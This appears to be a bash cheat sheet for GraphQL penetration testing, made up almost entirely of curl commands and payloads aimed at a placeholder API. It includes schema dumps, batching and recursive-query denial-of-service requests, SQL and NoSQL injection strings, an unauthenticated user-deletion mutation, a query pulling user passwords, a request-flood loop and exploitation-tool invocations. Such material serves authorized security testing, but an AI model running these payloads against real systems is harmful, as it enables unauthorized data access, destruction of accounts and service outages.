#!/bin/bash
# ==============================================
# GRAPHQL SECURITY TESTING CHEAT SHEET
# ==============================================

# 1. RECONNAISSANCE
# -----------------

# Introspection Query (Get Schema)
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://api.target.com/graphql

# Full Schema Dump
curl -X POST -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' https://api.target.com/graphql | jq 

# Find GraphQL Endpoints
grep -r "graphql" /path/to/source/code
ffuf -u https://target.com/FUZZ -w ~/wordlists/graphql_endpoints.txt

# 2. COMMON VULNERABILITIES
# -------------------------

# Batching Attacks (Multiple Queries)
curl -X POST -H "Content-Type: application/json" -d '[{"query":"query{user(id:1){email}}"},{"query":"query{user(id:2){email}}"}]' https://api.target.com/graphql

# Circular Queries (DoS)
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{__typename @a @b} fragment a on Query{__typename @b @c} fragment b on Query{__typename @c @a} fragment c on Query{__typename @a @b}"}' https://api.target.com/graphql

# Field Duplication (DoS)
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{user(id:1){email,email,email,email,email,email,email}}"}' https://api.target.com/graphql

# 3. INJECTION TESTING
# --------------------

# SQL Injection
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{users(filter:\"'\'' OR 1=1--\"){id email}}"}' https://api.target.com/graphql

# NoSQL Injection
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{login(username:\"admin'\", password:\"'\'' || '\''1'\''=='\''1\"){token}}"}' https://api.target.com/graphql

# 4. AUTHORIZATION TESTING
# -----------------------

# Missing Authorization Checks
curl -X POST -H "Content-Type: application/json" -d '{"query":"mutation{deleteUser(id:1){success}}"}' https://api.target.com/graphql

# Information Disclosure
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{allUsers{id email password}}"}' https://api.target.com/graphql

# 5. RATE LIMIT TESTING
# ---------------------

# Bypass Rate Limits
for i in {1..100}; do
  curl -X POST -H "Content-Type: application/json" -d '{"query":"query{__typename}"}' https://api.target.com/graphql &
done

# 6. TOOLS
# --------

# GraphQL Cop (Security Auditor)
python3 graphql-cop.py -t https://api.target.com/graphql

# InQL (Burp Extension)
# Available in BApp Store

# GraphQLmap
python3 graphqlmap.py -u https://api.target.com/graphql -v

# 7. MITIGATION TESTING
# ---------------------

# Introspection Disabled
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://api.target.com/graphql

# Query Cost Analysis
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{user(id:1){posts{comments{user{posts{comments{user{email}}}}}}"}' https://api.target.com/graphql

# 8. AUTOMATED SCANNING
# ---------------------

# Nuclei Templates
nuclei -t ~/nuclei-templates/graphql/ -u https://api.target.com/graphql -o graphql_scan.txt

# ==============================================
# TIPS:
# 1. Always check for introspection enabled
# 2. Test all three operations: queries, mutations, subscriptions
# 3. Look for verbose error messages
# 4. Test for CSRF (POST with Content-Type: application/json is generally safe)
# ==============================================

# RECOMMENDED WORDLISTS:
# ----------------------
# /usr/share/wordlists/graphql/common_queries.txt
# /usr/share/wordlists/graphql/directives.txt
# /usr/share/wordlists/graphql/fields.txt

# Recommended Tools to Install:
# GraphQL Cop - GraphQL security auditor
# InQL - Burp Suite extension
# GraphQLmap - GraphQL exploitation
# jq - JSON processor

# Common GraphQL Endpoints:
# /graphql
# /graphiql
# /gql
# /query
# /api/graphql